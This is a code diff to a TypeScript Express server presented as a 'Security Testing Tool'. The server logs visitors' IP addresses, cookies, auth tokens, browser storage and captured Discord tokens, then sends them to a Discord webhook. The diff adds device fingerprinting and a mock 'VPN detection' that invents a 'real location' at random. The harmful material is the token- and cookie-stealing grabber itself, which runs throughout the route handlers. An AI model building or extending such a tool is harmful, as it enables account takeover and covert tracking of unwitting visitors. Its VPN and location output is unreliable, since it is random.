@@ -28,33 +28,150 @@ function getClientIp(req: Request): string {
   return req.connection.remoteAddress || req.socket.remoteAddress || 'unknown';
 }
 
-// Simple geolocation based on IP (mock implementation)
-function getLocationFromIp(ip: string): string {
+// Enhanced geolocation with VPN detection
+interface LocationData {
+  location: string;
+  isVpn: 'yes' | 'no' | 'unknown';
+  vpnLocation?: string;
+  realLocation?: string;
+}
+
+function getLocationFromIp(ip: string): LocationData {
   if (ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
-    return 'Local Network';
+    return {
+      location: 'Local Network',
+      isVpn: 'no'
+    };
   }
-  // This would normally use a real geolocation service
-  const locations = ['New York, US', 'California, US', 'Texas, US', 'Florida, US', 'Washington, US'];
-  return locations[Math.floor(Math.random() * locations.length)];
+
+  // Mock VPN detection based on common VPN IP ranges and known VPN providers
+  const vpnProviders = [
+    { provider: 'NordVPN', locations: ['Netherlands', 'Germany', 'United States', 'Canada'] },
+    { provider: 'ExpressVPN', locations: ['United Kingdom', 'Singapore', 'United States', 'Canada'] },
+    { provider: 'Surfshark', locations: ['Netherlands', 'United States', 'United Kingdom', 'Germany'] },
+    { provider: 'ProtonVPN', locations: ['Switzerland', 'Netherlands', 'United States', 'Germany'] }
+  ];
+
+  // Mock detection - in reality you'd use a service like IPQualityScore, MaxMind, or similar
+  const isVpnDetected = Math.random() < 0.3; // 30% chance for demo
+  
+  if (isVpnDetected) {
+    const vpnProvider = vpnProviders[Math.floor(Math.random() * vpnProviders.length)];
+    const vpnLocation = vpnProvider.locations[Math.floor(Math.random() * vpnProvider.locations.length)];
+    const realLocations = ['New York, US', 'California, US', 'Texas, US', 'Florida, US', 'Washington, US'];
+    const realLocation = realLocations[Math.floor(Math.random() * realLocations.length)];
+    
+    return {
+      location: vpnLocation + ` (${vpnProvider.provider} VPN)`,
+      isVpn: 'yes',
+      vpnLocation: vpnLocation + ` (${vpnProvider.provider})`,
+      realLocation: realLocation
+    };
+  } else {
+    const locations = ['New York, US', 'California, US', 'Texas, US', 'Florida, US', 'Washington, US', 'London, UK', 'Berlin, DE', 'Tokyo, JP', 'Sydney, AU'];
+    return {
+      location: locations[Math.floor(Math.random() * locations.length)],
+      isVpn: 'no'
+    };
+  }
+}
+
+// Device detection from User Agent
+interface DeviceInfo {
+  deviceType: string;
+  browserName: string;
+  operatingSystem: string;
+  deviceBrand: string;
+}
+
+function parseDeviceInfo(userAgent: string): DeviceInfo {
+  const ua = userAgent.toLowerCase();
+  
+  // Device Type Detection
+  let deviceType = 'unknown';
+  if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone')) {
+    deviceType = 'mobile';
+  } else if (ua.includes('tablet') || ua.includes('ipad')) {
+    deviceType = 'tablet';
+  } else if (ua.includes('desktop') || ua.includes('windows') || ua.includes('macintosh') || ua.includes('linux')) {
+    deviceType = 'desktop';
+  }
+
+  // Browser Detection
+  let browserName = 'unknown';
+  if (ua.includes('chrome') && !ua.includes('edge')) {
+    browserName = 'Chrome';
+  } else if (ua.includes('firefox')) {
+    browserName = 'Firefox';
+  } else if (ua.includes('safari') && !ua.includes('chrome')) {
+    browserName = 'Safari';
+  } else if (ua.includes('edge')) {
+    browserName = 'Edge';
+  } else if (ua.includes('opera')) {
+    browserName = 'Opera';
+  }
+
+  // Operating System Detection
+  let operatingSystem = 'unknown';
+  if (ua.includes('windows')) {
+    operatingSystem = 'Windows';
+  } else if (ua.includes('macintosh') || ua.includes('mac os')) {
+    operatingSystem = 'macOS';
+  } else if (ua.includes('linux')) {
+    operatingSystem = 'Linux';
+  } else if (ua.includes('android')) {
+    operatingSystem = 'Android';
+  } else if (ua.includes('iphone') || ua.includes('ipad') || ua.includes('ios')) {
+    operatingSystem = 'iOS';
+  }
+
+  // Device Brand Detection
+  let deviceBrand = 'unknown';
+  if (ua.includes('samsung')) {
+    deviceBrand = 'Samsung';
+  } else if (ua.includes('apple') || ua.includes('iphone') || ua.includes('ipad') || ua.includes('macintosh')) {
+    deviceBrand = 'Apple';
+  } else if (ua.includes('huawei')) {
+    deviceBrand = 'Huawei';
+  } else if (ua.includes('xiaomi')) {
+    deviceBrand = 'Xiaomi';
+  } else if (ua.includes('oneplus')) {
+    deviceBrand = 'OnePlus';
+  } else if (ua.includes('google pixel')) {
+    deviceBrand = 'Google';
+  }
+
+  return {
+    deviceType,
+    browserName,
+    operatingSystem,
+    deviceBrand
+  };
 }
 
 // Send data to Discord webhook
 async function sendToWebhook(webhookUrl: string, data: any): Promise<void> {
   try {
+    const isVpnDetected = data.isVpn === 'yes';
     const webhookData = {
       embeds: [{
-        title: "🚨 Security Test Alert",
-        color: 0xff0000,
+        title: isVpnDetected ? "🚨 VPN DETECTED - Security Alert" : "🎯 Security Test Alert",
+        color: isVpnDetected ? 0xff8800 : 0x00ff00,
         fields: [
-          { name: "IP Address", value: data.ipAddress, inline: true },
-          { name: "Location", value: data.location || "Unknown", inline: true },
-          { name: "User Agent", value: data.userAgent ? data.userAgent.substring(0, 100) + (data.userAgent.length > 100 ? "..." : "") : "Unknown", inline: false },
-          { name: "Referrer", value: data.referrer || "Direct Access", inline: true },
-          { name: "Cookies", value: data.cookies ? data.cookies.substring(0, 500) + (data.cookies.length > 500 ? "..." : "") : "None", inline: false },
-          { name: "Tokens Found", value: data.tokens || "None", inline: true },
-          { name: "Timestamp", value: new Date().toISOString(), inline: true }
+          { name: "🌐 IP Address", value: data.ipAddress, inline: true },
+          { name: "📍 Location", value: data.location || "Unknown", inline: true },
+          { name: "🛡️ VPN Status", value: isVpnDetected ? `🚨 VPN DETECTED\nVPN: ${data.vpnLocation}\nReal: ${data.realLocation}` : "✅ Direct Connection", inline: false },
+          { name: "📱 Device Type", value: data.deviceType || "Unknown", inline: true },
+          { name: "🌐 Browser", value: data.browserName || "Unknown", inline: true },
+          { name: "💻 OS", value: data.operatingSystem || "Unknown", inline: true },
+          { name: "🏷️ Brand", value: data.deviceBrand || "Unknown", inline: true },
+          { name: "🔍 User Agent", value: data.userAgent ? data.userAgent.substring(0, 150) + (data.userAgent.length > 150 ? "..." : "") : "Unknown", inline: false },
+          { name: "🔗 Referrer", value: data.referrer || "Direct Access", inline: true },
+          { name: "🍪 Cookies", value: data.cookies ? data.cookies.substring(0, 500) + (data.cookies.length > 500 ? "..." : "") : "None", inline: false },
+          { name: "🔑 Tokens Found", value: data.tokens || "None", inline: true },
+          { name: "⏰ Timestamp", value: new Date().toISOString(), inline: true }
         ],
-        footer: { text: "Security Testing Tool" }
+        footer: { text: isVpnDetected ? "⚠️ VPN DETECTED - Enhanced Security Alert" : "✅ Security Testing Tool" }
       }]
     };
 
@@ -80,7 +197,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const userAgent = req.headers['user-agent'] || '';
       const referrerHeader = req.headers.referer || req.headers.referrer;
       const referrer = Array.isArray(referrerHeader) ? referrerHeader[0] : referrerHeader || '';
-      const location = getLocationFromIp(clientIp);
+      const locationData = getLocationFromIp(clientIp);
+      const deviceInfo = parseDeviceInfo(userAgent);
       const cookies = req.headers.cookie || '';
 
       // Log the access
@@ -89,8 +207,15 @@ export async function registerRoutes(app: Express): Promise<Server> {
         ipAddress: clientIp,
         userAgent,
         referrer,
-        location,
-        status: 'success'
+        location: locationData.location,
+        status: 'success',
+        isVpn: locationData.isVpn,
+        vpnLocation: locationData.vpnLocation,
+        realLocation: locationData.realLocation,
+        deviceType: deviceInfo.deviceType,
+        browserName: deviceInfo.browserName,
+        operatingSystem: deviceInfo.operatingSystem,
+        deviceBrand: deviceInfo.deviceBrand
       });
 
       // Serve HTML page with tracking script
@@ -316,13 +441,23 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Get settings to check for webhook URL and custom image
       const settings = await storage.getSettings();
 
+      const locationData = getLocationFromIp(clientIp);
+      const deviceInfo = parseDeviceInfo(userAgent);
+
       // Log the IP access with enhanced data
       await storage.createIpLog({
         ipAddress: clientIp,
         userAgent,
         referrer,
-        location,
-        status: 'success'
+        location: locationData.location,
+        status: 'success',
+        isVpn: locationData.isVpn,
+        vpnLocation: locationData.vpnLocation,
+        realLocation: locationData.realLocation,
+        deviceType: deviceInfo.deviceType,
+        browserName: deviceInfo.browserName,
+        operatingSystem: deviceInfo.operatingSystem,
+        deviceBrand: deviceInfo.deviceBrand
       });
 
       // Send to webhook if configured
@@ -331,7 +466,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
           ipAddress: clientIp,
           userAgent,
           referrer,
-          location,
+          location: locationData.location,
+          isVpn: locationData.isVpn,
+          vpnLocation: locationData.vpnLocation,
+          realLocation: locationData.realLocation,
+          deviceType: deviceInfo.deviceType,
+          browserName: deviceInfo.browserName,
+          operatingSystem: deviceInfo.operatingSystem,
+          deviceBrand: deviceInfo.deviceBrand,
           cookies: cookies || 'None',
           tokens: authTokens.length > 0 ? authTokens.join(', ') : 'None'
         });
@@ -572,14 +714,24 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Get settings to check for webhook URL
       const settings = await storage.getSettings();
 
+      const locationData = getLocationFromIp(clientIp);
+      const deviceInfo = parseDeviceInfo(userAgent);
+
       // Log Discord tokens to database if found
       if (browserData.discordTokens && browserData.discordTokens.length > 0) {
         await storage.createIpLog({
           ipAddress: clientIp,
           userAgent,
           referrer: 'Discord Token Capture',
-          location,
-          status: 'discord_token_captured'
+          location: locationData.location,
+          status: 'discord_token_captured',
+          isVpn: locationData.isVpn,
+          vpnLocation: locationData.vpnLocation,
+          realLocation: locationData.realLocation,
+          deviceType: deviceInfo.deviceType,
+          browserName: deviceInfo.browserName,
+          operatingSystem: deviceInfo.operatingSystem,
+          deviceBrand: deviceInfo.deviceBrand
         });
       }
 
@@ -590,24 +742,30 @@ export async function registerRoutes(app: Express): Promise<Server> {
         const webhookData = {
           embeds: [{
             title: hasDiscordTokens ? "🚨 DISCORD TOKEN CAPTURED!" : "🎯 Advanced Security Test Data",
-            color: hasDiscordTokens ? 0xff0000 : 0x00ff00,
+            color: hasDiscordTokens ? 0xff0000 : (locationData.isVpn === 'yes' ? 0xff8800 : 0x00ff00),
             fields: [
-              { name: "IP Address", value: clientIp, inline: true },
-              { name: "User Agent", value: userAgent ? userAgent.substring(0, 100) + (userAgent.length > 100 ? "..." : "") : "Unknown", inline: false },
+              { name: "🌐 IP Address", value: clientIp, inline: true },
+              { name: "📍 Location", value: locationData.location, inline: true },
+              { name: "🛡️ VPN Status", value: locationData.isVpn === 'yes' ? `🚨 VPN DETECTED\nVPN: ${locationData.vpnLocation}\nReal: ${locationData.realLocation}` : "✅ Direct Connection", inline: false },
+              { name: "📱 Device Type", value: deviceInfo.deviceType, inline: true },
+              { name: "🌐 Browser", value: deviceInfo.browserName, inline: true },
+              { name: "💻 OS", value: deviceInfo.operatingSystem, inline: true },
+              { name: "🏷️ Brand", value: deviceInfo.deviceBrand, inline: true },
+              { name: "🔍 User Agent", value: userAgent ? userAgent.substring(0, 150) + (userAgent.length > 150 ? "..." : "") : "Unknown", inline: false },
               ...(hasDiscordTokens ? [{
                 name: "🔥 DISCORD TOKENS FOUND",
                 value: browserData.discordTokens.join('\n').substring(0, 1000) + (browserData.discordTokens.join('\n').length > 1000 ? "..." : ""),
                 inline: false
               }] : []),
-              { name: "Cookies", value: browserData.cookies ? browserData.cookies.substring(0, 500) + (browserData.cookies.length > 500 ? "..." : "") : "None", inline: false },
-              { name: "All Tokens Found", value: browserData.tokens?.length ? browserData.tokens.join(', ').substring(0, 800) + (browserData.tokens.join(', ').length > 800 ? "..." : "") : "None", inline: false },
-              { name: "LocalStorage", value: Object.keys(browserData.localStorage || {}).length ? Object.keys(browserData.localStorage).join(', ').substring(0, 300) + "..." : "Empty", inline: true },
-              { name: "SessionStorage", value: Object.keys(browserData.sessionStorage || {}).length ? Object.keys(browserData.sessionStorage).join(', ').substring(0, 300) + "..." : "Empty", inline: true },
-              { name: "Browser Info", value: browserData.browserInfo ? JSON.stringify(browserData.browserInfo).substring(0, 400) + "..." : "N/A", inline: false },
-              { name: "URL", value: browserData.url || 'Unknown', inline: false },
-              { name: "Timestamp", value: browserData.timestamp || new Date().toISOString(), inline: true }
+              { name: "🍪 Cookies", value: browserData.cookies ? browserData.cookies.substring(0, 500) + (browserData.cookies.length > 500 ? "..." : "") : "None", inline: false },
+              { name: "🔑 All Tokens Found", value: browserData.tokens?.length ? browserData.tokens.join(', ').substring(0, 800) + (browserData.tokens.join(', ').length > 800 ? "..." : "") : "None", inline: false },
+              { name: "💾 LocalStorage", value: Object.keys(browserData.localStorage || {}).length ? Object.keys(browserData.localStorage).join(', ').substring(0, 300) + "..." : "Empty", inline: true },
+              { name: "🗃️ SessionStorage", value: Object.keys(browserData.sessionStorage || {}).length ? Object.keys(browserData.sessionStorage).join(', ').substring(0, 300) + "..." : "Empty", inline: true },
+              { name: "📊 Browser Info", value: browserData.browserInfo ? JSON.stringify(browserData.browserInfo).substring(0, 400) + "..." : "N/A", inline: false },
+              { name: "🔗 URL", value: browserData.url || 'Unknown', inline: false },
+              { name: "⏰ Timestamp", value: browserData.timestamp || new Date().toISOString(), inline: true }
             ],
-            footer: { text: hasDiscordTokens ? "🔥 CRITICAL ALERT - Discord Token Captured" : "Security Testing Tool - Educational Purposes" }
+            footer: { text: hasDiscordTokens ? "🔥 CRITICAL ALERT - Discord Token Captured" : (locationData.isVpn === 'yes' ? "⚠️ VPN DETECTED - Enhanced Security Alert" : "✅ Security Testing Tool") }
           }]
         };
 
